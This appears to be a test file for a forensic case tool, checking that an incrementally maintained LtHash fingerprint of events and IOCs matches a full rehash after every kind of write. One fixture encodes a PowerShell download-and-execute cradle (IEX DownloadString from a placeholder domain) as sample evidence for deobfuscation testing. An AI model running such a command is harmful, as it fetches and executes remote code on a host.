import { describe, it, expect, beforeEach, afterEach, vi } from "vitest";
import { createHash } from "node:crypto";
import { runInNewContext } from "node:vm";
import { mkdtemp, rm } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { CaseStore } from "../../src/storage/caseStore.js";
import { StateStore } from "../../src/analysis/stateStore.js";
import { emptyState, type ForensicEvent, type InvestigationState } from "../../src/analysis/stateTypes.js";
import { canonicalize } from "../../src/analysis/analysisRunHash.js";
import {
  investigationFingerprintOfCase,
  investigationOutput,
  investigationOutputOfCase,
  stateHash,
  stateHashOfSums,
  STATE_HASH_ID,
} from "../../src/analysis/analysisRunSnapshot.js";
import { LT_HASH_WORKER_SOURCE, ltHex, ltSum } from "../../src/analysis/ltHash.js";
import { itemDigest, refreshRowFacts, rowFactsStamp } from "../../src/analysis/rowFacts.js";
import { deltaSchema, type AnalysisDelta } from "../../src/analysis/responseSchema.js";
import { mergeDelta, type WindowContext } from "../../src/analysis/stateMerge.js";
import { mergeIntoCase } from "../../src/analysis/caseMerge.js";
import { deobfuscateRows } from "../../src/composition/deobfuscationRows.js";
import { scriptBlockSignal } from "../../src/analysis/tradecraftRules.js";
import { caseSqliteWorker } from "../../src/analysis/caseSqliteWorker.js";
import { loadDatabaseSync } from "../../src/analysis/sqliteRuntime.js";

// #1887: the run record's case fingerprint, investigation-state/v3. Events and IOCs are LtHash sums
// of their item digests, and the case database keeps both sums, folding in only the rows a write
// changed (the row_facts triggers log them in fp_log). The kept sums must always give what hashing
// the loaded case gives, whatever wrote to the case.

function ev(id: string, description: string, p: Partial<ForensicEvent> = {}): ForensicEvent {
  return {
    id,
    timestamp: `2026-01-0${1 + (Number(id.replace(/\D/g, "")) % 9)}T00:00:00Z`,
    description,
    severity: "Medium",
    mitreTechniques: [],
    relatedFindingIds: [],
    sourceScreenshots: [],
    ...p,
  };
}

const psEnc = (plaintext: string): string =>
  `powershell.exe -NoProfile -enc ${Buffer.from(plaintext, "utf16le").toString("base64")}`;

const hex = (text: string): string => createHash("sha256").update(text).digest("hex");

let dir: string;
let store: StateStore;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), "dfir-fpv3-"));
  const cases = new CaseStore(dir);
  await cases.createCase({ caseId: "c1", name: "n", investigator: "i", aiProvider: null });
  store = new StateStore(cases);
});

afterEach(async () => {
  await rm(dir, { recursive: true, force: true });
});

const seeded = (): InvestigationState => ({
  ...emptyState("c1"),
  findings: [{ id: "f1", title: "t", severity: "High", description: "d", relatedEventIds: ["e2"] } as never],
  iocs: [
    { id: "i001", type: "ip", value: "203.0.113.9" } as never,
    { id: "i002", type: "domain", value: "a.example.com" } as never,
  ],
  forensicTimeline: Array.from({ length: 30 }, (_, i) => ev(`e${i}`, `row ${i}`, { asset: "H1" })),
});

/** The v3 hash written out from its definition, from a loaded case, with node:crypto alone. */
function v3Reference(state: InvestigationState): string {
  const sum = (items: readonly unknown[]): string => {
    const lanes = new Array<number>(1024).fill(0);
    for (const item of items) {
      const digest = hex(JSON.stringify(canonicalize(item)));
      const el = createHash("shake128", { outputLength: 4096 })
        .update("dfir-companion/v3\n" + digest)
        .digest();
      for (let i = 0; i < 1024; i++) lanes[i] = (lanes[i] + el.readUInt32LE(4 * i)) % 2 ** 32;
    }
    const out = Buffer.alloc(4096);
    lanes.forEach((lane, i) => out.writeUInt32LE(lane, 4 * i));
    return out.toString("hex");
  };
  return hex(
    JSON.stringify(
      canonicalize({
        findings: state.findings,
        forensicTimeline: sum(state.forensicTimeline),
        iocs: sum(state.iocs),
      }),
    ),
  );
}

/** The incremental fingerprint equals the pure one of a load, and came from the kept sums. */
async function expectFresh(caseId = "c1"): Promise<string> {
  const state = await store.load(caseId);
  const pure = investigationOutput(state).hashes[0].sha256;
  expect(pure).toBe(v3Reference(state));
  expect(await investigationFingerprintOfCase(store, caseId)).toEqual({
    sha256: pure,
    findings: state.findings,
    entityIds: [...state.forensicTimeline.map((e) => e.id), ...state.iocs.map((i) => i.id)],
  });
  // The op itself answered from its kept sums (not the full-listing fallback) and folded the log.
  const op = await store.factsFingerprintV3(caseId, rowFactsStamp());
  expect(op && op.needsFull).toBe(false);
  expect(logRows(caseId)).toBe(0);
  return pure;
}

function withDb<T>(caseId: string, fn: (db: InstanceType<ReturnType<typeof loadDatabaseSync>>) => T): T {
  const db = new (loadDatabaseSync())(store.databasePath(caseId));
  try {
    return fn(db);
  } finally {
    db.close();
  }
}

const logRows = (caseId: string): number =>
  Number((withDb(caseId, (db) => db.prepare("SELECT count(*) AS n FROM fp_log").get()) as { n: number }).n);

let step = 0;
function importDelta(prefix: string, n: number): { d: AnalysisDelta; ctx: WindowContext } {
  step++;
  const d = deltaSchema.parse({
    findings: [],
    iocs: [{ id: `${prefix}i1`, type: "file", value: `C:\\Windows\\Temp\\${prefix}-0.exe` }],
    mitreTechniques: [],
    forensicEvents: Array.from({ length: n }, (_, i) => ({
      id: `${prefix}e${i + 1}`,
      timestamp: `2026-07-${String(1 + (i % 28)).padStart(2, "0")}T10:00:00.000Z`,
      description: `Service installed ${prefix}-${i}`,
      severity: "Medium",
      mitreTechniques: [],
      relatedFindingIds: [],
      asset: "HOST-1",
      sources: ["SIEM import"],
    })),
    threadsOpened: [],
    threadsClosed: [],
    timelineNote: `import of ${n} event(s)`,
    summary: "",
  });
  const ctx: WindowContext = {
    windowSequence: -1,
    timestamp: `2026-09-30T10:${String(step).padStart(2, "0")}:00.000Z`,
    sourceScreenshots: [`import-${step}.json`],
  };
  return { d, ctx };
}

describe("investigation-state/v3 (#1887)", () => {
  it("is the id the run record writes", () => {
    expect(STATE_HASH_ID).toBe("investigation-state/v3");
    expect(investigationOutput(seeded()).hashes[0]).toEqual({
      id: STATE_HASH_ID,
      sha256: v3Reference(seeded()),
    });
  });

  it("changes with one event's severity and with a duplicate event, not with the timeline's order", () => {
    const base = seeded();
    const h = (s: InvestigationState): string => investigationOutput(s).hashes[0].sha256;
    const graded = {
      ...base,
      forensicTimeline: base.forensicTimeline.map((e, i) =>
        i === 4 ? { ...e, severity: "High" as const } : e,
      ),
    };
    const duplicated = { ...base, forensicTimeline: [...base.forensicTimeline, base.forensicTimeline[3]] };
    const twice = {
      ...duplicated,
      forensicTimeline: [...duplicated.forensicTimeline, base.forensicTimeline[3]],
    };
    const reversed = { ...base, forensicTimeline: [...base.forensicTimeline].reverse() };
    expect(new Set([h(base), h(graded), h(duplicated), h(twice)]).size).toBe(4);
    expect(h(reversed)).toBe(h(base));
    // An IOC and an event with the same content are still told apart by the list they sit in.
    const moved = {
      ...base,
      iocs: [base.iocs[1]],
      forensicTimeline: [...base.forensicTimeline, base.iocs[0] as never],
    };
    expect(h(moved)).not.toBe(h(base));
  });

  it("equals a reference written from the definition, duplicates included", () => {
    const small: InvestigationState = {
      ...emptyState("c1"),
      findings: seeded().findings,
      iocs: [seeded().iocs[0]],
      forensicTimeline: [ev("e1", "one"), ev("e2", "two"), ev("e1", "one")],
    };
    expect(investigationOutput(small).hashes[0].sha256).toBe(v3Reference(small));
  });

  it("runs the same arithmetic in the worker's copy as in the module", () => {
    const context: Record<string, unknown> = { require, Buffer };
    runInNewContext(LT_HASH_WORKER_SOURCE, context);
    const apply = context.ltApply as (sum: Uint32Array, digest: string, sign: number) => void;
    const encode = context.ltWorkerEncode as (sum: Uint32Array, encoding: string) => string;
    const decode = context.ltWorkerDecode as (text: string, encoding: string) => Uint32Array | null;
    const digests = ["a", "b", "c", "a"].map(hex);
    const sum = new Uint32Array(1024);
    for (const d of [...digests, hex("gone")]) apply(sum, d, 1);
    apply(sum, hex("gone"), -1);
    expect(encode(sum, "hex")).toBe(ltHex(ltSum(digests)));
    expect(encode(decode(encode(sum, "base64"), "base64")!, "hex")).toBe(ltHex(ltSum(digests)));
    expect(decode("AAAA", "base64")).toBeNull();
    expect(ltHex(ltSum([]))).toBe("0".repeat(8192));
  });

  it("does not wrap a multiplicity at 65,536 copies (32-bit lanes)", () => {
    const one = hex("same event");
    expect(ltHex(ltSum(Array.from({ length: 65_536 }, () => one)))).not.toBe(ltHex(ltSum([])));
  });

  it("gives the empty case's hash for a case with no state", async () => {
    const empty = investigationOutput(emptyState("c1")).hashes[0].sha256;
    expect(await investigationFingerprintOfCase(store, "c1")).toEqual({
      sha256: empty,
      findings: [],
      entityIds: [],
    });
  });

  it("keeps the database's sums equal to hashing the loaded case after every kind of write", async () => {
    await store.save(seeded());
    const hashes = [await expectFresh()];
    // An importer merge (the incremental path after the first one).
    for (const prefix of ["a", "b"]) {
      const { d, ctx } = importDelta(prefix, 25);
      await mergeIntoCase(store, "c1", d, ctx, (s) => mergeDelta(s, d, ctx));
      hashes.push(await expectFresh());
    }
    // An analyst edit and a severity change.
    const [r1, r2] = await store.forensicRowsById("c1", ["e3", "ae4"]);
    await store.updateForensicRows("c1", [
      { ...r1, event: { ...r1.event, description: "analyst note" } },
      { ...r2, event: { ...r2.event, severity: "Critical" } },
    ]);
    hashes.push(await expectFresh());
    // A delete.
    const gone = await store.forensicRowsById("c1", ["e5", "be2"]);
    await store.deleteForensicRows(
      "c1",
      gone.map((g) => g.rowId),
    );
    hashes.push(await expectFresh());
    // A full save with an edited event.
    const state = await store.load("c1");
    await store.save({
      ...state,
      forensicTimeline: state.forensicTimeline.map((e) =>
        e.id === "e7" ? { ...e, description: "rewritten" } : e,
      ),
    });
    hashes.push(await expectFresh());
    // An append, including two identical events.
    await store.appendForensicEvents("c1", [ev("e90", "appended"), ev("e91", "twin"), ev("e91", "twin")]);
    hashes.push(await expectFresh());
    // IOC additions and an IOC edit.
    const overview = await store.loadOverview("c1");
    await store.saveOverview({
      ...overview,
      iocs: [
        { ...overview.iocs[0], value: "203.0.113.10" },
        ...overview.iocs.slice(1),
        { id: "i900", type: "ip", value: "198.51.100.1" } as never,
      ],
    });
    hashes.push(await expectFresh());
    // The deobfuscation sweep writes rows and IOCs.
    await store.appendForensicEvents("c1", [
      ev("e92", psEnc("IEX (New-Object Net.WebClient).DownloadString('http://a.example.com/x')")),
    ]);
    await deobfuscateRows(store, "c1", { gradeDerived: scriptBlockSignal });
    hashes.push(await expectFresh());
    // Every step changed the case, so every hash differs.
    expect(new Set(hashes).size).toBe(hashes.length);
  });

  it("rebuilds the sums after the row facts' stamp changes", async () => {
    await store.save(seeded());
    const before = await expectFresh();
    // Other code's facts: every row is dropped and queued; the next fingerprint recomputes them all.
    await store.factsPending("c1", "another-build", 10);
    expect(await store.factsFingerprintV3("c1", rowFactsStamp())).toEqual({ needsFull: true });
    expect(await expectFresh()).toBe(before);
  });

  it("seeds the sums of a case that has row facts but no kept sums yet", async () => {
    await store.save(seeded());
    await refreshRowFacts(store, "c1");
    const before = await expectFresh();
    // A case from before v3: facts are there, the mirror is empty and nothing is stamped. A wrong
    // mirror row and a stray log entry left behind must not survive the seed either.
    withDb("c1", (db) => {
      db.exec("DELETE FROM fp_rows; DELETE FROM fp_log; DELETE FROM storage_meta WHERE key='fp_sum';");
      db.exec("INSERT INTO fp_rows(row_id, kind, digest) VALUES (999999, 'iocs', 'stale')");
      db.exec("INSERT INTO fp_log(kind, digest, sign) VALUES ('iocs', 'stale', 1)");
    });
    expect(await expectFresh()).toBe(before);
    // A damaged kept value is rebuilt too.
    withDb("c1", (db) => db.exec("UPDATE storage_meta SET value='{\"stamp\":1}' WHERE key='fp_sum'"));
    expect(await expectFresh()).toBe(before);
    // So is a kept sum that still decodes but no longer matches its check (one lane damaged).
    withDb("c1", (db) => {
      const kept = JSON.parse(
        (db.prepare("SELECT value FROM storage_meta WHERE key='fp_sum'").get() as { value: string }).value,
      ) as { forensic: string };
      const bytes = Buffer.from(kept.forensic, "base64");
      bytes[0] ^= 1;
      db.prepare("UPDATE storage_meta SET value=? WHERE key='fp_sum'").run(
        JSON.stringify({ ...kept, forensic: bytes.toString("base64") }),
      );
    });
    expect(await expectFresh()).toBe(before);
  });

  it("gives the same fingerprint from the full listing as from the kept sums", async () => {
    await store.save(seeded());
    const kept = await investigationFingerprintOfCase(store, "c1");
    const listingOnly = Object.assign(Object.create(store) as StateStore, {
      factsFingerprintV3: async () => ({ needsFull: true as const }),
    });
    expect(await investigationFingerprintOfCase(listingOnly, "c1")).toEqual(kept);
  });

  it("falls back to the full listing when a row's facts are unknown", async () => {
    await store.save(seeded());
    const before = await expectFresh();
    const [row] = await store.forensicRowsById("c1", ["e2"]);
    await store.updateForensicRows("c1", [{ ...row, event: { ...row.event, severity: "Low" } }]);
    expect(await store.factsFingerprintV3("c1", rowFactsStamp())).toEqual({ needsFull: true });
    expect(await expectFresh()).not.toBe(before);
  });
});

describe("investigationOutputOfCase (#1887)", () => {
  it("gives the whole-case output from the kept sums, without the full per-row listing", async () => {
    await store.save(seeded());
    await investigationFingerprintOfCase(store, "c1"); // seed the kept sums
    const listing = vi.spyOn(store, "factsFingerprint");
    const out = await investigationOutputOfCase(store, "c1");
    expect(listing).not.toHaveBeenCalled();
    expect(out).toEqual(investigationOutput(await store.load("c1")));
  });

  it("gives the same output from the full listing when the kept sums cannot answer", async () => {
    await store.save(seeded());
    const listingOnly = Object.assign(Object.create(store) as StateStore, {
      factsFingerprintV3: async () => ({ needsFull: true as const }),
    });
    expect(await investigationOutputOfCase(listingOnly, "c1")).toEqual(
      investigationOutput(await store.load("c1")),
    );
  });

  it("loads the case on a store without row facts", async () => {
    const state = seeded();
    const plain = { load: async () => state } as never;
    expect(await investigationOutputOfCase(plain, "c1")).toEqual(investigationOutput(state));
  });

  it("gives the empty case's output for a case with no state", async () => {
    expect(await investigationOutputOfCase(store, "c1")).toEqual(investigationOutput(emptyState("c1")));
  });
});

describe("the LtHash triggers on row_facts (#1887)", () => {
  async function freshCase(): Promise<{ rowId: number; digest: string }> {
    await store.save(seeded());
    await caseSqliteWorker.request({ op: "ensureDatabase", dbPath: store.databasePath("c1") });
    await expectFresh();
    const [row] = await store.forensicRowsById("c1", ["e1"]);
    const digest = itemDigest((await store.load("c1")).forensicTimeline.find((e) => e.id === "e1"));
    return { rowId: row.rowId, digest };
  }

  const fake = "f".repeat(64);

  /** The pure v3 of the digests row_facts holds now (what the kept sums must track). */
  async function factsHash(): Promise<string> {
    const findings = (await store.load("c1")).findings;
    const digests = (kind: string): string[] =>
      (
        withDb("c1", (db) =>
          db
            .prepare("SELECT f.digest FROM row_facts f JOIN entities e ON e.row_id=f.row_id WHERE e.kind=?")
            .all(kind),
        ) as { digest: string }[]
      ).map((r) => r.digest);
    return stateHash(findings, digests("forensicTimeline"), digests("iocs"));
  }

  /** The op's own hash, without the facts refresh in front of it. */
  async function opHash(): Promise<string> {
    const op = await store.factsFingerprintV3("c1", rowFactsStamp());
    if (!op || op.needsFull) throw new Error("expected kept sums");
    expect(logRows("c1")).toBe(0);
    return stateHashOfSums(op.findings, op.forensic, op.iocs);
  }

  const run = (sql: string, ...args: (string | number)[]): void =>
    withDb("c1", (db) => {
      db.prepare(sql).run(...args);
    });

  it("an INSERT OR REPLACE with another digest takes the old digest out and puts the new one in", async () => {
    const { rowId, digest } = await freshCase();
    const before = await opHash();
    run("INSERT OR REPLACE INTO row_facts(row_id, id, digest) VALUES (?, 'e1', ?)", rowId, fake);
    expect(await opHash()).toBe(await factsHash());
    expect(await opHash()).not.toBe(before);
    run("INSERT OR REPLACE INTO row_facts(row_id, id, digest) VALUES (?, 'e1', ?)", rowId, digest);
    expect(await opHash()).toBe(before);
    await expectFresh();
  });

  it("an INSERT OR IGNORE that inserts nothing changes nothing", async () => {
    const { rowId } = await freshCase();
    const before = await opHash();
    run("INSERT OR IGNORE INTO row_facts(row_id, id, digest) VALUES (?, 'e1', ?)", rowId, fake);
    expect(await opHash()).toBe(before);
    await expectFresh();
  });

  it("a cascade delete of the entity takes its digest out", async () => {
    const { rowId } = await freshCase();
    withDb("c1", (db) => {
      db.exec("PRAGMA foreign_keys=ON");
      db.prepare("DELETE FROM entities WHERE row_id=?").run(rowId);
      expect(db.prepare("SELECT count(*) AS n FROM row_facts WHERE row_id=?").get(rowId)).toEqual({ n: 0 });
    });
    expect(await opHash()).toBe(await factsHash());
    await expectFresh();
  });

  it("an update of a digest takes the old one out and puts the new one in", async () => {
    const { rowId, digest } = await freshCase();
    const before = await opHash();
    run("UPDATE row_facts SET digest=? WHERE row_id=?", fake, rowId);
    expect(await opHash()).toBe(await factsHash());
    run("UPDATE row_facts SET digest=? WHERE row_id=?", digest, rowId);
    expect(await opHash()).toBe(before);
    await expectFresh();
  });
});
